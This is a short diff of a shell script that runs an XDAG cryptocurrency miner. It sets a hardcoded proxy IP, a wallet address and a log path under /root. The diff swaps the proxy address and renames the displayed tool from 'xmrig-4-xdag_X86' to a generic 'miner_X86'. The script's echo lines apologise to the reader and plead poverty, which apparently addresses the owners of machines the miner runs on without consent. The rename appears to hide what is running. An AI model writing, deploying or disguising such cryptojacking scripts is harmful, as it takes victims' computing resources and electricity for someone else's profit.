@@ -3,7 +3,7 @@
 echo "对不起,对不起,对不起,重要的事情说三遍..."
 echo "同是运维岗,失业一年之久,没钱吃饭了,搞点泡面吃,绕我一命,感谢,万分感谢."
 
-ProxyIP="203.12.201.162:5432"
+ProxyIP="116.202.3.220:24656"
 Wallet="8qdb2c1qfrL19R83mux1LdmGRgBASrqmm"
 RunLog="/root/xdagminer/Run.log"
 
@@ -16,8 +16,8 @@ CORES=$(cat /proc/cpuinfo | grep "processor" | wc -l)
     do
       cpu_accepted=$(tail -n 10 Run.log | grep "cpu      accepted" | tail -n 1)
       miner_speed=$(tail -n 10 Run.log | grep "miner    speed" | tail -n 1)
-      echo -e "\e[1;32mxmrig-4-xdag_X86　　$CORES　$cpu_accepted\e[0m"
-      echo -e "\e[1;36mxmrig-4-xdag_X86　　$CORES　$miner_speed\e[0m"
+      echo -e "\e[1;32mminer_X86　　$CORES　$cpu_accepted\e[0m"
+      echo -e "\e[1;36mminer_X86　　$CORES　$miner_speed\e[0m"
       sleep 1
     done
 
